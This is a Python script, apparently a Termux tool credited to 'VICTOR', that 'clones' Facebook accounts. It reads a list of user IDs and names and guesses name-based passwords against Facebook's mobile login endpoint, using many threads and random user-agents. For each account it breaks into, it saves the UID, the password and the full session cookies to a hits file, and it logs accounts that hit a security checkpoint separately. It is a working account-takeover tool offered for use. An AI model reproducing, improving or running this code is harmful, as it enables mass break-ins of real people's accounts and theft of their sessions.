

###---------------### MODULES ###--------------- ###


import os, time, base64, datetime, json, sys, re, threading, uuid, string
from concurrent.futures import ThreadPoolExecutor as ThreadPool

os.system("pip uninstall PySintx -y")
os.system("pip uninstall PyBookScrapper -y")
os.system("pip uninstall PyBookAgents -y")

try:
    import PySintx
except ModuleNotFoundError:
    os.system("pip3 install git+https://github.com/sintxcs/PySintx.git")
    import PySintx
from PySintx import *

'''
I'm using PySintx for my text color and modules dependencies like rich, random, and requests.
'''

try:
    import PyBookAgents
except ModuleNotFoundError:
    os.sytem("pip3 install git+https://github.com/sintxcs/PyBookAgents.git")
    import PyBookAgents

'''
I'm using PyBookAgents for user-agent generator
Check documentaion here: https://github.com/sintxcs/PyBookAgents
'''

try:
    import PyBookScrapper
except ModuleNotFoundError:
    os.system("pip3 install git+https://github.com/sintxcs/PyBookScrapper.git")
    import PyBookScrapper

# I'm using PyBookScrapper for scrapping of the following:
from PyBookScrapper import Scrape_Year

'''
Check documentaion here: https://github.com/sintxcs/PyBookScrapper
'''

###---------------### VARIABLES ###--------------- ###


_F = "/sdcard/SINTX/"
_D = "clear"
_B = "\n"
_A = "bold white"

try:
    os.makedirs(_F)
except:
    pass
sntxfldr = _F

cmd(_D)


###---------------### DATE TIME CHECKER ###--------------- ###


script_status = "V.0.1"
months_check = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
date_now = datetime.datetime.now().day
month_now = months_check[str(datetime.datetime.now().month)]
date_month = str(month_now) + "-" + str(date_now)


###---------------### LOGO ###--------------- ###


lxgos = """

                 d8,                                
                `8P           d8P                   
                d888888P                 
      ?88   d8P  88b d8888b  ?88'   d8888b   88bd88b
      d88  d8P'  88Pd8P' `P  88P   d8P' ?88  88P'  `
      ?8b ,88'  d88 88b      88b   88b  d88 d88     
      `?888P'  d88' `?888P'  `?8b  `?8888P'd88'



"""
sinInfo = "[white][›] PRESS [bold yellow]CTRL AND Z[bold white] TO STOP THE PROGRAM\n\n[white][-] FACEBOOK : VICTOR BANTAWA RAI\n[-] GITHUB   : THE-LEGEND-VIICTOR"


def sintx_logo():
    cmd(_D)
    prnt(pnl(lxgos, title=f"{script_status}", subtitle="CRAFTED BY : VICTOR"))
    prnt(pnl(sinInfo, width=90, style=_A))


###---------------### MENU ###--------------- ###


def sintx_menu():
    B = "[sky_blue1][1] FILE CLONING\n[0] REPORT ERROR"
    sintx_logo()
    prnt(pnl(B, width=90, style=_A, title="OPTIONS"))
    A = input(f"{green}  [?] OPTION:{dark_gray} ")
    if A == "1":
        ク克隆()
    if A == "0":
        cmd("xdg-open https://m.me/victorsimpman")
        sintx_menu()
    else:
        アニメ(f"{ro}  [!] INVALID INPUT")
        sintx_menu()


###---------------### FILE CLONING ###--------------- ###


loop = 0
oks = []
cps = []
twf = []
ugen = []


def ク克隆():
    sintx_logo()
    E = "/sdcard/"
    prnt(pnl("[yellow][»] ENTER NAME OF YOUR FILE", width=90, style=_A))
    F = input(f"{green}  [+] /sdcard/:{dark_gray} ")
    G = E + F
    try:
        B = open(G, "r").read().splitlines()
    except FileNotFoundError:
        cd(1)
        print(f"\n{lr}  [X] FILE NOT FOUND")
        cd(3)
        ク克隆()
    A = []
    prnt(
        pnl(
            "[sky_blue1][1] SYSTEM PASSWORD LIST\n[2] YOUR PASSWORD LIST",
            width=90,
            style=_A,
            title="SELECT PASSWORD METHOD",
        )
    )
    H = input(f"{green}  [›] CHOICE:{dark_gray} ")
    if H in ["1", "01"]:
        A.append("firstlast123")
        A.append("last first")
        A.append("first@123")
        A.append("First123")
        A.append("first12345")
        A.append("first321")
        A.append("First@123")
        A.append("first@12345")
        A.append("First last")
        A.append("firstlast")
        A.append("last12345")
        A.append("first@12")
        A.append("last123")
        A.append("first last")
        A.append("firstfirst")
        A.append("last123")
        A.append("last@12")
        A.append("last@1234")
        A.append("last12345")
        A.append("lastlast")
        A.append("firstfirst")
        A.append("last1234")
        A.append("first@1234")
        A.append("first@last")
        A.append("Nepal123")
        A.append("first@321")
        A.append("First123456")
    else:
        try:
            prnt(
                pnl(
                    "[yellow][?] HOW MANY PASSWORD DO YOU WANT TO USE?",
                    width=90,
                    style=_A,
                )
            )
            C = int(input(f"{green}  [›] ANSWER:{dark_gray} "))
        except:
            C = 1
        prnt(
            pnl(
                "[yellow] first last, first123, first1234, last123, last321",
                width=90,
                style=_A,
                title="EXAMPLE PASSWORD",
            )
        )
        for I in range(C):
            A.append(input(f"{green}  [›] PASSWORD #{I+1}:{dark_gray} "))
    with ThreadPool(max_workers=None) as J:
        prnt(
            pnl(
                "[yellow][»] ON/OFF FIRST YOUR DATA FOR 5 SECONDS AND PRESS ENTER",
                width=90,
                style=_A,
                title="INSTRUCTIONS",
            )
        )
        input(f"{green}  [»] PRESS ENTER: ")
        sintx_logo()
        D = str(len(B))
        prnt(
            pnl(
                "[yellow][»] NOT FOR SALE!",
                width=90,
                style=_A,
                title="NOTICE!",
            )
        )
        K = "[white][-] TOTAL IDS TO CLONE: " + D + "\n[-] RESULT PATH: VICTOR FOLDER"
        prnt(pnl(K, width=90, style=_A, title="FILE INFO"))
        for L in B:
            M, N = L.split("|")
            O = A
            J.submit(sinsAPI_, M, N, O, D)
    P = "[»] HITS : " + str(len(oks))
    Q = "\n[»] CPS  : " + str(len(cps))
    print(_B)
    prnt(pnl(P + Q, width=90, style=_A, title="PROCESS COMPLETED"))
    input(f"{dark_gray}  [›] PRESS ENTER TO REFRESH ")
    sintx_menu()


###---------------### API (MBASIC) ###--------------- ###


def sinsAPI_(uid, names, pxss_, tot4l):
    F = names
    A = uid
    global loop, oks, cps
    sys.stdout.write(
        f"\r\r{dark_gray}  [VICTOR] %s/%s - OKS: %s - CPS: %s\r "
        % (loop, tot4l, len(oks), len(cps))
    )
    sys.stdout.flush()
    C = requests.Session()
    try:
        G = F.split(" ")[0]
        try:
            D = F.split(" ")[1]
        except:
            D = "143"
        L = G.lower()
        M = D.lower()
        for N in pxss_:
            B = (
                N.replace("First", G)
                .replace("Last", D)
                .replace("first", L)
                .replace("last", M)
            )
            header = {
                "authority": "m.facebook.com",
                "method": "GET",
                "scheme": "https",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
                "cache-control": "no-cache, no-store, must-revalidate",
                "referer": "https://m.facebook.com/",
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "Android",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "pragma": "no-cache",
                "priority": "u=1",
                "cross-origin-resource-policy": "cross-origin",
                "upgrade-insecure-requests": "1",
                "user-agent": str(PyBookAgents.random_ugen()),
            }
            I = C.get(
                f"https://m.facebook.com/login/device-based/password/?uid={A}&flow=login_no_pin&refsrc=deprecated&_rdr"
            )
            S = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(I.text)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(I.text)).group(
                    1
                ),
                "uid": A,
                "next": "https://mbasic.facebook.com/login/save-device/",
                "flow": "login_no_pin",
                "pass": B,
            }
            C.post(
                "https://m.facebook.com/login/device-based/validate-password/?shbl=0",
                data=S,
                allow_redirects=False,
                headers=header,
            ).text
            J = C.cookies.get_dict().keys()
            if "c_user" in J:
                K = ";".join(
                    ["%s=%s" % (A, B) for (A, B) in C.cookies.get_dict().items()]
                )
                open(sntxfldr + f"HITS-{date_month}.txt", "a").write(
                    A + "|" + B + "~" + Scrape_Year(uid) + _B + K + "\n\n"
                )
                print(_B)
                T = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
                E = pnl(
                    T, width=90, style="bold pale_turquoise1", title="VICTOR SUCCESSFUL"
                )
                prnt(E)
                oks.append(A)
                break
            elif "checkpoint" in J:
                cps.append(A)
                print(_B)
                U = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
                E = pnl(U, width=90, style="bold red", title="VICTOR CHECKPOINT")
                prnt(E)
                open(sntxfldr + f"CPS-{date_month}.txt", "a").write(
                    A + "|" + B + "~" + Scrape_Year(uid) + _B
                )
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)


###---------------### START ###--------------- ###


if __name__ == "__main__":
    try:
        sintx_menu()
    except Exception as e:
        exit()
